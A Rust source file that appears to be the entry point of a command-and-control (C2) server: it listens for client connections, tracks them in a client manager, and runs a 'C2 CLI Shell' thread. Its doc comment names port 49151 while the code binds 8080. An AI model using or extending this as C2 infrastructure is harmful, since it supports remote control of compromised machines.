mod client;
mod terminal;

use std::net::TcpListener;

use client::ClientManager;
use terminal::{cli_server, handle_client};


/// Entry point for the server application.
///
/// Initializes a TCP server that listens on port 49151, manages client connections,
/// and spawns threads for various tasks including handling client data, listening for
/// heartbeats, and monitoring client connections.
#[tokio::main]
async fn main() -> tokio::io::Result<()> {
    let ip_port = "0.0.0.0:8080";
    let listener = TcpListener::bind(ip_port).unwrap();

    println!("[I] Server listening on {}", ip_port);

    // Client DB
    let client_manager: ClientManager = ClientManager::new();

    // Thread for the C2 CLI Shell
    let server_client_manager_clone = client_manager.clone();
    tokio::spawn(async move { cli_server(server_client_manager_clone) } );

    // Handle incoming client connections
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                // Thread that handle the communication with this client
                let client_manager_clone = client_manager.clone();
                tokio::spawn(async move { handle_client(stream, client_manager_clone) } );

            },
            Err(e) => {
                println!("[E] Error while listening for new connections: {}", e);
            }
        }
    }

    Ok(())
}










